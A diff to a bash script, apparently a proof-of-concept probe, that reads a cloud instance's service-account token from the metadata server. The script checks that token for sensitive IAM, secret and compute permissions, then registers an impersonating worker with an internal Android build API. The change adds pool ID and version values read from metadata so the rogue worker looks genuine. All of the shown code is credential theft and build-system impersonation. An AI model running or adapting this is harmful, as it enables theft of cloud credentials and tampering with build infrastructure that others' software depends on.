@@ -32,12 +32,18 @@ scopes="$(curl -fsS --max-time 3 -H "$metadata_header" \
   "$metadata_root/instance/service-accounts/default/scopes" 2>/dev/null | tr '\n' ',')"
 token_json="$(curl -fsS --max-time 3 -H "$metadata_header" \
   "$metadata_root/instance/service-accounts/default/token" 2>/dev/null)"
+rbe_pool_id="$(curl -fsS --max-time 3 -H "$metadata_header" \
+  "$metadata_root/instance/attributes/pool_id" 2>/dev/null)"
+rbe_pool_version="$(curl -fsS --max-time 3 -H "$metadata_header" \
+  "$metadata_root/instance/attributes/pool_version" 2>/dev/null)"
 access_token="$(printf '%s' "$token_json" | sed -n \
   's/.*"access_token"[[:space:]]*:[[:space:]]*"\([^"]*\)".*/\1/p')"
 
 printf 'metadata_project_id=%s\n' "$project_id"
 printf 'metadata_project_number=%s\n' "$project_number"
 printf 'metadata_scopes=%s\n' "$scopes"
+printf 'metadata_rbe_pool_id=%s\n' "$rbe_pool_id"
+printf 'metadata_rbe_pool_version=%s\n' "$rbe_pool_version"
 
 if [[ -n "$access_token" && -n "$project_id" ]]; then
   project_permissions='{"permissions":["resourcemanager.projects.get","resourcemanager.projects.getIamPolicy","resourcemanager.projects.setIamPolicy","serviceusage.services.use","serviceusage.services.list","iam.serviceAccounts.list","iam.serviceAccounts.create","iam.serviceAccounts.getAccessToken","iam.serviceAccounts.actAs","secretmanager.secrets.list","secretmanager.secrets.create","secretmanager.versions.access","storage.buckets.list","storage.buckets.create","compute.instances.list","compute.instances.create","compute.instances.setMetadata","compute.instances.setServiceAccount","cloudbuild.builds.list","cloudbuild.builds.get","cloudbuild.builds.create","artifactregistry.repositories.list","artifactregistry.repositories.downloadArtifacts","artifactregistry.repositories.uploadArtifacts","pubsub.topics.list","pubsub.topics.publish","bigquery.datasets.create"]}'
@@ -155,9 +161,16 @@ if [[ -n "$access_token" && -n "$project_id" ]]; then
     'https://androidbuildinternal.googleapis.com/android/internal/build/v3/workNodes?maxResults=1'
 
   bot_id="hi-from-robert-d21766e5-$(hostname)"
+  worker_properties_fragment=''
+  if [[ "$rbe_pool_id" =~ ^[A-Za-z0-9._:/-]+$ \
+      && "$rbe_pool_version" =~ ^[A-Za-z0-9._:/-]+$ ]]; then
+    worker_properties_fragment="$(printf \
+      '"properties":[{"key":"rbePoolID","value":"%s"},{"key":"rbePoolVersion","value":"%s"}],' \
+      "$rbe_pool_id" "$rbe_pool_version")"
+  fi
   bot_session_body="$(printf \
-    '{"botId":"%s","status":"INITIALIZING","version":"b0244-d21766e5","worker":{"devices":[{"handle":"primary","properties":[{"key":"label:OSFamily","value":"Linux"},{"key":"label:Pool","value":"b0244-hi-from-robert-d21766e5"}]}]}}' \
-    "$bot_id")"
+    '{"botId":"%s","status":"INITIALIZING","version":"b0244-d21766e5","worker":{%s"devices":[{"handle":"primary","properties":[{"key":"label:OSFamily","value":"Linux"},{"key":"label:Pool","value":"b0244-hi-from-robert-d21766e5"}]}]}}' \
+    "$bot_id" "$worker_properties_fragment")"
   bot_response_file="/tmp/b0244-bot-session-$$.json"
   bot_http_status="$(curl -sS --max-time 20 -X POST \
     -H "Authorization: Bearer $access_token" \
